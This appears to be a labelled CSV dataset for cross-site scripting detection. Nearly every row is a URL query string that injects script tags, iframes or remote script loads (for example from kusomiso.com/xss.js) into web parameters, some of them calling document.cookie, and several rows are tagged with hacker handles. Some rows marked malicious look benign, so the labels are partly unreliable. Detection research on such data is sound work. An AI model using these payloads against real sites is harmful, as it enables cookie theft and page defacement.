Payload,Label
T1=WHERE%20ag'%3E%22%3E%3CSCRIPT/SRC=http://kusomis<br/>o.com/xss.js%3E%3C/SCRIPT%3EEency%20=%20'Harrington'&SortColumn=fundseries,1
q=%22%3E%3CscRipt%3Ealert%28123%29%3C/Scrip<br/>T%3E,1
SearchType=Keyword&Keyword=%22%3E%3Ciframe+src%3Djavascrip<br/>t%3Ax=%22xssed%22;alert%28x%29%3B+style%3D%22display%3Anone%3B%22+%2F%3E%3Cspan+id%3D%22&imageField.<br/>x=5&imageField.y=10,1
query=x%5C%22%3E%3CsCRipT%3Ealert%28123%29%3C%2FSCrIpT%3E%5C%2<br/>2,1
palabras=><script>alert('Xss')<br/></script>><marquee><h1>%20%20%20%20By+IVAN_SANCHEZ%20www.NULLCODE.com.ar%20</h1></marquee>&desde=0&l<br/>argo=10&op=buscar&como=Y&donde=TIT&secId=&fecha=90&lr=lang_es&q=&pubId=CLARIN,1
lid=de&tid=modern_blue&f_user=&six=&f_email==%<br/>22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/ifra<br/>me%3E,1
"folder=""><script>alert(document.cookie)</scrip<br/>t>><marquee><h1>By+Narcoticxs</h1></marquee>",1
ti=6&si=27&p=topic%22%3E'%3E%3Cscript%3Ealert('X<br/>')%3C/script%3E,1
sayfa=32&kelime=%22%3E%3Cscript%3Ealert(1)%3C/script%3E,1
error=Cannot%20show%20file%20_menu_es=%22%3E%3Cscript%3Ealer<br/>t('www.nullcode.com.ar%20-%20Hunting%20Security%20Bugs!')%3C/script%3E.htm,1
page=%22'%3E%3Cscript%3Ealert(1)%3C/script%3E,1
"ID=""><marquee><h1>By+Narcoticxs</h1></marquee><iframe%20s<br/>rc=http://xssed.com>",1
query=%22%3E%3Cscript%3Ealert(%22NURBONEGRO%60%22)<br/>%3C/script%3E&searchtitle=&segment=&topic=&author=&contenttypes[]=all&timeframe=all&sortby=Date&Subm<br/>it.x=39&Submit.y=6&Submit=Submit,1
PHPSESSID=db5257ed38becc11c3e54f30b944b2c3&query=x%22%3E%27<br/>%3E%3CscRipT%3Ealert%28123%29%3C%2FScRIpT%3E%22&x=0&y=0,1
"searchbox=""><marquee><h1>By+Narcoticxs</h1></marquee><iframe%2<br/>0src=http://xssed.com>",1
email=%22%3E%3Ch1%3EBy%20Kusomiso.com%3C/h1%3E&name=%22%3E<br/>%3Ch1%3EBy%20Kusomiso.com%3C/h1%3E%3Cscript%3Ealert(1)%3C/script%3E,1
keyword=%3Cscript%3Ealert%28%22Wolfrat+pwns%22%29%3C%2Fscript<br/>%3E,1
pt=2&vid=1190475784_1X04X1364695966&rpt=2&kt=1,1
highlight=%27%3e%22%3e%3cSCRIPT%2fSRC%3dhttp<br/>%3a%2f%2fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fSCRIPT%3e&where=pages&search=go,1
action=search&s_name=%22%3E%3Cscript%3Ealert%28%27x<br/>ss%27%29%3C%2Fscript%3E&s_rules=%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&s_not_rules=&s<br/>_type=%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&s_exp=%22%3E%3Cscript%3Ealert%28%27xss%2<br/>7%29%3C%2Fscript%3E&s_not_exp=&s_artist=%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&s_flav<br/>our=%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&order=name&view=normal&x=14&y=13&rarity=&s<br/>elected_block=Time+Spiral-block&cc_left=0&cc_right=16&cost=&power_left=-1&power_right=13&toughness_l<br/>eft=-1&toughness_right=14&red=0&black=0&white=0&blue=0&green=0&multi=0&land=0&artifact=0&tokens=1&sp<br/>ecial=1&basicland=1&group=1,1
search=x%22%3E%27%3E<br/>%3CscRipT%3Ealert%28123%29%3C%2FScRIpT%3E%22,1
mode=search&selQuickSearch=quicksearch&txtTitle=%3Cscript<br/>%3Ealert(%22Just%20another%20cult%22);%20alert(%22ap101%22)%3C/script%3E&cookie%5Ftest=1,1
mode%5Bsearch_and%5D=starcraft<script>alert(1)</script>&mode%5Bs<br/>earch_like%5D=&mode%5Bsearch_or%5D=&crit%5Blang%5D=&crit%5Btype%5D=&crit%5Bformat%5D%5B%5D=&crit%5Bl<br/>ocation%5D=&crit%5Bhost%5D=,1
docid=278868&query=x%22%3E'%3E%3CscRipT%3Ealert(12<br/>3)%3C/ScRIpT%3E%22,1
page=products.php&bgnum=%22%3Ch1%3EUPPER_LEFT_CORNER%3C/h1<br/>%3E%3Cscript%3Ealert(1)%3C/script%3E,1
id=lb%22%3E'%3E%3Cscript%3Ealert('X')%3C/script%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28<br/>123%29%3C%2Fscript%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%2<br/>8123%29%3C%2Fscript%3E,1
A1=ind0510%3CIFRAME%20SRC=javascript:alert('XSS');%3E%<br/>3C/IFRAME%3E&L=gpo-fdlp-l&O=T',1
Query=x%22%3E%27%3E%3CscRipT%3Ealert%28123%29%3C%<br/>2FScRIpT%3E%22,1
lid=5&tid=2&f_user=&six=&f_email==%22%3E%3Ch1%3ENu<br/>ll%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
TextFritext=%22%3E%3Cscript%<br/>3Ealert%28123%29%3C%2Fscript%3E,1
lid=de&tid=modern_blue&f_user=&six=&f_email=index.php?lid=de&t<br/>id=modern_blue&f_user=&six=&f_email==%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%2<br/>0src=http://www.google.com/%3E%3C/iframe%3E,1
lid=3&tid=4&f_user=&six=&f_email==%22%3E%3Ch1<br/>%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
folder=frutales&n=/folderview.asp//gallery/folderview.asp?folder=<br/>%3E%22%3E%3Cscript%3Ealert%28%27iNs uNkn0wn.eu CreW%27%29%3C%2Fscript%3E,1
q=3&curPage=1357&srchStr=%27%3e%22%3e%3cSCRIPT%2fSRC%3dhttp%3a%2f<br/>%2fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fSCRIPT%3e,1
rid=&key=&search_source=201&tda=search&t=&s=%3Cscript%3Eal<br/>ert%28%22XSS%22%29%3C%2Fscript%3E&Submit=Recherche&search_src_radio=,1
buscado=x%22%3E%3CsCript%3Ealert%28123%29%3C%2FScripT%3E%22&<br/>x=14&y=13,1
folder=&n=/igallery//gallery/folderview.asp?folder=<br/>%3E%22%3E%3Cscript%3Ealert%28%27iNs uNkn0wn.eu CreW%27%29%3C%2Fscript%3E,1
search=%27%3E%22%3E%3CSCRIPT%2FSRC%3Dhttp%3A%2F%2Fkusomiso.c<br/>om%2Fxss.js%3E%3C%2FSCRIPT%3E&Submit=%C8%F1%EA%E0%F2%FC,1
search=%3E%22%3E%3Cscript%3Ealert(1)%3C/scri<br/>pt%3E,1
"current=1&folderid=""><script>alert(document.cookie)</script><br/>><marquee><h1>By+www.r3t.n3t.nl</h1></marquee>",1
lid=ch_big5&tid=default&f_user=&six=&f_email==%22%3E%3Ch1%<br/>3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
lid=ch&tid=modern_blue&f_user=&six=&f_email<br/>==%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/i<br/>frame%3E,1
lang=eshttp://www.buenosaires.gov.ar/are<br/>as/turismo/servicios/index.php?lang=es=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
folder=Holiday+Pictures&n=/IGallery//gallery/folderview.a<br/>sp?folder=%3E%22%3E%3Cscript%3Ealert%28%27iNs uNkn0wn.eu CreW %27%29%3C%2Fscript%3E,1
lid=es&tid=beauvoir&f_user=&six=&f_email==%22%3E%3Ch1%3EN<br/>ull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
src=%3Cscript%3Ealert(/DarkMindZ.com%20||%20RoMeO/)%3C/script%3E,1
lid=de&tid=modern_blue&f_user=&six=&<br/>f_email==%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%<br/>3E%3C/iframe%3E,1
lid=dk&tid=modern_blue&f_user=&six=&f_email=<br/>=%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/if<br/>rame%3E,1
lid=5&tid=1&f_user=&six=&f_email==%22%3E%3Ch1%3ENull<br/>%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
"query=%27%3e%22%3e%3cSCRIPT%2fSRC%3dhttp%3a%2f%2fkusomiso%2ecom%2<br/>fxss%2ejs%3e%3c%2fSCRIPT%3e&indication_mode=list&videocollection=agesagenew,agesageall",1
cx=015723998419849412855:fqyojabclx0&q=\%22%3E%3CSCRIPT%<br/>20SRC=http://ha.ckers.org/xss.js%3E%3C/SCRIPT%3E%20'S-Bahn%20Berlin%20GmbH'&cof=FORID:9&string=\%22%<br/>3E%3CSCRIPT%20SRC=http://ha.ckers.org/xss.js%3E%3C/SCRIPT%3E,1
loginuser=123@bamtri.com&err=1&sid=301664703e90f99611&tid<br/>=0&lid=5&retid=30166=%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.<br/>google.com/%3E%3C/iframe%3E,1
lid=es&tid=beauvoir&f_user=&six=&f_email==%22%3E%3Ch1%3ENul<br/>l%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
err=1&sid={4703AF4C2661A-4703AF4C26DE6-1191423820}&tid=0&li<br/>d=1=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
"id=133"")</script><script>alert(123)</script>",1
idTagBoard=53635,1
lid=0&f_user==%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1<br/>%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
where=all&what=%22%3E%27%3E%3CsCript%3Ealert%28123%29%3C%2FsCript<br/>%3E&x=10&y=8,1
lid=it&tid=modern_blue&f_user=&six=&f_email==%22%3<br/>E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3<br/>E,1
epl=00940041VFAXVE0DWlgVVRBeVwMAFQRMD0MTWkdcDlNTHlxbXA<br/>RcWgxZVAAOWQBCCw9BCxVBBEcSWRNZVhhPVlpVHlVuDFEJVA8AUQ,1
lid=es&tid=modern_blue&f_user=&six=&f_emai<br/>l==%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/<br/>iframe%3E,1
rango=1&texto==%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/i<br/>frame%3E,1
query=%22%3E%3Cscript%3Ealert(%22XSSed%20by%20Dr.Op<br/>tix%22);alert(document.cookie)%3C/script%3E&c17=0&subquery=,1
tc=1&query=x%22%3E%27%3E%3CscRipT%3Ealert%28123%29%3C%2FScRIpT%3E%22&<br/>s2=by&adse.x=0&adse.y=0&adse=%CD%E0%E9%F2%E8,1
q=%27%29%3Balert%28'xssed'%29%3B+%2F%2F&articlesMax=&downloadsMax=&for<br/>umsMax=&reviewsMax=&staticMax=&source=&articlesMinscore=65&zone=articles,1
reid=%22%3E%3Cscript%3Ealert(420)%3C/script%3E,1
searchtext=%22%3E%3Cscript%3Ealert(420)%<br/>3C/script%3E,1
page=%3E%22%3E%3Cscript%3Ealert%28%27iNs uNkn0wn.eu<br/>CreW%27%29%3C%2Fscript%3E,1
lookup=on&wwwhois=on&portNum=80&target=%22%3E%3CSCRIPT+SRC%3D%2F%2Fha.ckers<br/>.org%2F.j%3E&submit=Get+Info,1
url=aHR0cDovL3hzc2VkLmNvbQ==,1
lid=bg&tid=beauvoir&f_user=&six=&f_email==%22%3E%3Ch1%3<br/>ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
lid=nl&tid=hungi.mozilla&f_user=&six=&f_email==%22%3E%3<br/>Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
country=%22%3E%3Cscript%3Ealert(420)%3C/script%3E,1
id=%22%3E%3Cscript%3Ealert(420)%<br/>3C/script%3E,1
q=<h1><font color=red>XSS VULNERABILITY YOU NAZI<br/>FUCKERS</font></h1><sCRipT>alert(123)</ScRIpt>&s=0,1
query=%22%3E%3Cscript%3Ealert(420)%3C/script%3E,1
style=%22%3E%3Cscript%3Ealert(1)%3C/script%3E,1
catID=1;alert(document.cookie),1
"search=>""><script>alert('Discovered by iNs -<br/>uNkn0wn.eu.')</script>",1
vaa=/cursos/clases_tarot.asp?cursoid=8=%22%3E%3Ciframe%2<br/>0src=http://www.google.com/%3E%3C/iframe%3E,1
"search=""><h1>BackDoor<script>alert(""BackDoor"")</script>",1
t=%22%3E%3Cscript%3Ealert(420)%3C/script%3E,1
page=%22%3E'%3E%3Cscript%3Ealert('Xss')%3C/script%3E,1
id=cjclub'%3E%22%3E%3CSCRIPT/SRC=http://kusomiso.com/xss.js%3E%3C/S<br/>CRIPT%3E,1
"searchcriteria=directories.headline&searchtex<br/>t=""'><iframe%20src=http://xssed.com>",1
"folder=""><script>alert(document.cookie)</script>><mar<br/>quee><h1>By+Narcoticxs</h1></marquee>",1
url=http://67.52.216.216/&reason=Anonymizer/'%3E%22%3E%3CSCRI<br/>PT/SRC=http://kusomiso.com/xss.js%3E%3C/SCRIPT%3E,1
cvename=CVE-2007-3987%3C/title%3E%22%3E'%3E%3Cscript%3Ealert('Xss')%3C/s<br/>cript%3E,1
SectionID=22&ContentID=882&Searchtext=%22%3E<br/>%3Cscript%3Ealert(420)%3C/script%3E,1
"folder=""><script>alert(document.cookie)</scri<br/>pt>><marquee><h1>By+Narcoticxs</h1></marquee>",1
ACTION=noframe&url=%22%3E%3Cscript%3Ealert(%22xssed%22)%3C/script%3E,1
scd=1&qs=%22%3E'%3E%3Cscript%3Ealert('X')%3C/script%3E&idp=&kno=,1
page=loaderinfo&loaderName=%3C/script%3E%3Cscript%3Ealert(12345<br/>678987654321)%3C/script%3E,1
query=x%22%3E%27%3E%3CscRipT%3Ealert%28123%29%3C%2FScRIpT%3E%22,1
bbsaction=disp_rep_form&amode=&page=1&blood=20070317<br/>195501&parent=2325%22%3E'%3E%3Cscript%3Ealert('Xss')%3C/script%3E,1
searchText=%22%3E%3Cscript%3Ealert(420)<br/>%3C/script%3E,1
lista=busca&cat_id=1&cat_nome=<script>document.body.<br/>innerHTML='<br><br><center><h1>RootDamages Group Security FasT</h1>'</script>,1
c=socie'%3E%22%3E%3CSCRIPT/SRC=http://kusomiso.com/<br/>xss.js%3E%3C/SCRIPT%3Ety_table::427,1
RUN=/etc/passwd&RCN=customCreate&RDN=4&ALD=https%3A%2F%2Fap<br/>ply%2Eembark%2Ecom&CLU=%22%3E%3Cscript%3Ealert(%22Owned%20By%20RoMeO%20DarkMindZ.com%22)%3C/script%3<br/>E,1
s=2451&c=25&title=&place=&publisher=&gengo1=&<br/>year1=&gengo2=&year2=&note=%22%3E'%3E%3Cscript%3Ealert('Xss')%3C/script%3E&,1
"folder=""><script>alert(document.cookie)</script>><br/><marquee><h1>By+Narcoticxs</h1></marquee>",1
search=5&ads=a'%3E%22%3E%3CSCRIPT/SRC=http://kusomiso.<br/>com/xss.js%3E%3C/SCRIPT%3E&state=WA,1
mno=&scd=1&sk=1&idp=&qs=%22%3E'%3E%3Cscript%3Ealert('X')<br/>%3C/script%3E,1
fancyname=%22%3E'%3E%3Cscript%3Ealert('X')%3C/script<br/>%3E,1
year=2007&month=10'%3E%22%3E%3CSCRIPT/S<br/>RC=http://kusomiso.com/xss.js%3E%3C/SCRIPT%3E3E,1
referer=home&que=%22%3E%3Cscript%3Ealert%28<br/>%27xss%27%29%3C%2Fscript%3E%22,1
email=%27%3e%22%3e%3cSCRIPT%2fSRC%3dhttp%3a%2f%2<br/>fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fSCRIPT%3e&mlA=1&mlB=1&htmlml=1&Submit=%8Am%94F&Submit2=%83%8A%83Z<br/>%83b%83g,1
key=%22%3E'%3E%3Cscript%3Ealert('Xss')%3C/scrip<br/>t%3E,1
tmpl=mobile&char_id=0954'%3E%22%3E%3CSCRIPT/SRC=http://kusomi<br/>so.com/xss.js%3E%3C/SCRIPT%3E,1
text=%3E%22%3E%3Cscript%3Ealert%28%27iNs uNkn0wn.eu<br/>CreW%27%29%3C%2Fscript%3E,1
%3C/title%3E'%3E%22%3E%3CSCRIPT/SRC=http://kusomiso.com/x<br/>ss.js%3E%3C/SCRIPT%3E,1
"folder=""><script>alert(document.cookie)</script>><m<br/>arquee><h1>By+Narcoticxs</h1></marquee>",1
scd=1&qs=&idp=&kno='%3E%22%3E%3CSCRIPT/SRC=http://kusomiso.c<br/>om/xss.js%3E%3C/SCRIPT%3E,1
scd=1&qs=scd=1&qs=&idp='%3E%22%3E%3CSCRIPT/SRC=http://kusom<br/>iso.com/xss.js%3E%3C/SCRIPT%3E&kno=,1
volume=pcd0796&img=9&size=3'%3E%22%3E'%3E%3Cscr<br/>ipt%3Ealert(%22XSS%20By%20kusomiso.com%22)%3C/script%3E,1
Keywords=%27%3E%22%3E%3CSCRIPT%2FSRC%3Dhttp%3A%2F%2Fkusomiso.com%2Fx<br/>.js%3E%3C%2FSCRIPT%3E&r=c%253EZny2bYOpMnqx%2527tfbsdi%2560uzqf%253Etfbsdi%2527f%253Ekq%253CKQ%253C9%<br/>253C2%253C2%253C581565%253Ctuzmf2%25609%252Fdtt%253C3%253Cjoufsdptnpt%2560bggjmjbuf%25602%2560e3s%25<br/>60efsq%253Cublftijpop%253Cublftijpop%253C26878%253C26878%253Cdmfbo%253C%2527enybsht%253E17pFOzb5%255<br/>BHKcMVYmzOWS.ySYZsO4eH%2560bhdF%2560KEmvFgrQPqZBsZL8EDCGEEuFMpI4BHuUqsK8pEjQ%2560zCvKqgv9%255B5hy7xe<br/>PC%2560PIGr3iXPSPDmf%257B4HPGQ9RJD%253AyyyI%257BdetGRgZ%253ATKU6MLkIhChVYbd7Shtjii2VvOU9%2560OdSB2y6<br/>E4pPzChPE.%2560rg5ONX272Q8qzVB.SL9Bp2mFbdOKh%252F%252F-ZU1%257B&Submit=Go,1
"folder=""><script>alert(document.cookie)</script>><<br/>marquee><h1>By+Narcoticxs</h1></marquee>",1
"folder=""><script>alert(document.cookie)<<br/>/script>><marquee><h1>By+Narcoticxs</h1></marquee>",1
mno=&scd=1&sk=1&idp=&qs=&nonlogin=1%22%3E'%3E%3Cscript%3<br/>Ealert('X')%3C/script%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscr<br/>ipt%3E&submit1=++S%F6k+++&RadioDisplayResult=&ComboSortOrder=0,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&s<br/>ubmit1=++S%F6k+++&RadioDisplayResult=2&ComboSortOrder=1&Host_nr=1,1
"Asunto=/mail.asp?to=>""><script>alert('Discovered by iNs -<br/>uNkn0wn.eu.')</script>",1
"folder=""><script>alert(document.cook<br/>ie)</script>><marquee><h1>By+Narcoticxs</h1></marquee>",1
mode=search&text=%3cscript%3eale<br/>rt(String.fromCharCode(88%2c83%2c83))%3b%3c%2fscript%3e,1
q=%22%3E%27%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&x=37&y=1<br/>6,1
ref='%3E%22%3E%3CSCRIPT/SRC=http://kusomiso.com/xss.js%3E%3C/SCRIPT%3<br/>E,1
path=%22%3E'%3E%3Cscript%3Ealert('X')%3C/script%3E,1
"folder=""><script>alert(document.cookie)</script>><ma<br/>rquee><h1>By+Narcoticxs</h1></marquee>",1
"folder=""><script>alert(document.cookie)</script<br/>>><marquee><h1>By+Narcoticxs</h1></marquee>",1
Search=%22%3E%3Ciframe%20src=javascript:alert(/xssed/)<br/>;%20style=display:none;%20/%3E%3C!--&ID=1,1
ref='%3E%22%3E%3CSCRIPT/SRC=http://kusomiso.com/xss.js%3E%3C/SCRIPT%<br/>3E,1
lang=es=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/ifra<br/>me%3E,1
s1=LCSD%2CLCSD-pdf%2CLCSD2%2CLCSD3%2CLCSD3-chi%2CCultural%2CTen<br/>der%2CLeisureOA%2CLeisureCRSP%2CBalloting&s2=HKPL&s3=HKHM&p2scope=0&p=+%3E%22%3E%3Cscript%3Ealert%28<br/>%22XSS%22%29%3C%2Fscript%3E&start=1&start=Search&so=0&a=10&fta=1,1
hash='%3E%22%3E%3CSCRIPT/SRC=http://kusomiso.com/xss.js%3E%3C/SCRIPT%<br/>3E,1
term=<script>alert(123)</script>&ver=kjv,1
search=%22%3E%3Cscript%3Ealert(420)%3C/script%3E=allwords,1
"folder=""><script>alert(docum<br/>ent.cookie)</script>><marquee><h1>By+Narcoticxs</h1></marquee>",1
"folder=""><script>alert(document.cookie)</script>><marq<br/>uee><h1>By+Narcoticxs</h1></marquee>",1
id=1&mode=individual&no=1&eid=11'%3E%22%3E%3CSCRIPT/SRC=http<br/>://kusomiso.com/xss.js%3E%3C/SCRIPT%3Ehttp://express.bandai.co.jp/m/index.cgi?id=1&mode=individual&n<br/>o=1&eid=11'%3E%22%3E%3CSCRIPT/SRC=http://kusomiso.com/xss.js%3E%3C/SCRIPT%3E,1
EntryLimit=%22%3E%3Cscript%3E<br/>alert(420)%3C/script%3E,1
"folder=""><script>alert(document.cookie<br/>)</script>><marquee><h1>By+Narcoticxs</h1></marquee>",1
sid=9fb61f7435a7f7f87a8d9428a1b3a6b5&tid=defaul<br/>t&lid=de&error=-ERR+%5BAUTH%5D+Password+supplied+for+%22123%22+is+incorrect.%0D%0A=%22%3E%3Ch1%3ENul<br/>l%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
q=<script>alert(123)</script>&so=1,1
"folder=""><script>alert(document.cooki<br/>e)</script>><marquee><h1>By+Narcoticxs</h1></marquee>",1
"q=""><script>alert(123)</script>&x=0&y=0",1
id=%22%3E%3Cscript%3Ealert(420<br/>)%3C/script%3E,1
module=cautare&keyword=%22%3E%3Cscript+src%3Dhttp%3A%2F%2Fdroptix.viral<br/>coders.com%2Fxss.js%3E,1
search=%22%3E%3Cscript%3Ealert(420)%3C/script%3E=Search+%3E%3E&mod<br/>e=allwords,1
"q=%3Cscript%3Ealert(String.fromCharCode(88,83<br/>,83));%3C/script%3E",1
restrict=support&link=&loc=se&term=x%22%3E%3C<br/>scRipt%3Ealert%28123%29%3C%2FScrIpt%3E%22&go=S%C3%B6k,1
"folder=""><script>alert(document.cookie)</script>><marquee><h1<br/>>By+Narcoticxs</h1></marquee>",1
q=%27%3E%22%3E%3CSCRIPT%2FSRC%3Dhttp%3A%2F%2Fkusomiso.com%2Fxss.js<br/>%3E%3C%2FSCRIPT%3E,1
lang=es=%22%3E%3Ch1%3EExploit%20Some%20XSS%3C/h1<br/>%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
id=0042189&u=http://'%3E%22%3E%3CSCRIPT/SRC=http://kusomiso.com/xss.js<br/>%3E%3C/SCRIPT%3E,1
query=x%22%3E%<br/>3CscRipt%3Ealert%28123%29%3C%2FScrIpt%3E%22&submit=S%C3%B6k,1
ID=131/default.asp?id=%3E%22%3E%3Cscript%3Eal<br/>ert%28%27iNs uNkn0wn.eu CreW%27%29%3C%2Fscript%3E,1
page=%22%3E%3Cscript%3Ealert%280%29%3B%3C%2Fscript%3E,1
"event=displayStoreSelector&keyword=production_p<br/>remium&promoid=""><script>alert(document.cookie)</script>><marquee><h1>By+Narcoticxs</h1></marquee>",1
lid=6&tid=1&f_user=&six=&f_email==%22%3E%3Ch1%3ENull%2<br/>0Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
"event=displayStoreSelector&keyword=""><script>al<br/>ert(document.cookie)</script>><marquee><h1>By+Narcoticxs</h1></marquee>",1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3<br/>E&submit1=++S%F6k+++&RadioDisplayResult=&ComboSortOrder=0,1
xTitle=%22%3E%3Cscript%3Ealert(420)%3C/script%3E,1
"loc=en%5Fus&nf=""><script>alert(document.cookie)</<br/>script>><marquee><h1>By+Narcoticxs</h1></marquee>",1
Title=%22%3E%3Cscript%3Ealert(420)%3C/script%3E,1
Unid=%22%3E%3Cscript%3Ealert(420)%3C/script%3E,1
subject=%22%3E%3Cscript%3Ealert(420)%3C/script%3E%22%3E%3Cscri<br/>pt%3Ealert(420)%3C/script%3E,1
page=731&ClassID=%22%3E%3Cscript%3Ealert(420)%3C/script%3E,1
pageno=8&query=3&value=x%22%3E%27%3E%3CscRipT%3Ealert%28123%29%<br/>3C%2FScRIpT%3E%22&Submit=Search..,1
subject=%22%3E%3Cscript%3Ealert(420)%3C/script%3E,1
Page=26&List=10%27%3e%22%3e%3cSCRIPT%2fSRC%<br/>3dhttp%3a%2f%2fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fSCRIPT%3e,1
isicsymb=242&isicname=%27%3e%22%3e%3cSCRIPT%2fS<br/>RC%3dhttp%3a%2f%2fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fSCRIPT%3e,1
rtn=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,1
q=%3Ci%3E%3Cu%3E%3Cb%3Ez0mg%21++html+injection%21%3C%2Fb%3E%3C%2Fu%<br/>3E%3C%2Fi%3E%3Cscript%3Ealert(1)%3C/script%3E,1
next=%22%3E%3Cscript%3Ealert%28123%29%3C%2F<br/>script%3E,1
file=%%27%3e%22%3e%3cSCRIPT%2fSRC%3dhttp%3a%<br/>2f%2fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fSCRIPT%3e,1
action=showSub&catID=12&subCatID=%22%3E%3Cmarquee%3E%<br/>3Ch1%3EBy+Narcoticxs%3C/h1%3E%3C/marquee%3E%3Cbody%20onload=alert(1)%3E,1
nID=11008%27%3e%22%3e%3cSCRIPT%2fSRC%3dhttp%3a%2f%2fkusomiso%2eco<br/>m%2fxss%2ejs%3e%3c%2fSCRIPT%3e,1
option=com_content&task=view&id=54&Itemid=187=%22%3E%3Ciframe%20sr<br/>c=http://www.google.com/%20width=866%20height=450%3E%3C/iframe%3E,1
textquery=%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C%2Fsc<br/>ript%3E&search_type=all&x=22&y=6,1
t=3&id=1802&sid=%22%3E%3Cscript%3Ealert(420)%3C/scr<br/>ipt%3E,1
id=3618%27%3e%22%3e%3ciframe%20src%3dhttp%3a%2<br/>f%2fkusomiso%2ecom%2fxss%2ehtml%20%3c,1
dir=scut&q=scut&hitsPerPage=10&query=x%22%3E%27%3E%3CscRip<br/>T%3Ealert%28123%29%3C%2FScRIpT%3E%22&start=0&num=10&outputFormat=HTML&ftype=&ctype=&site=&imageField<br/>.x=0&imageField.y=0,1
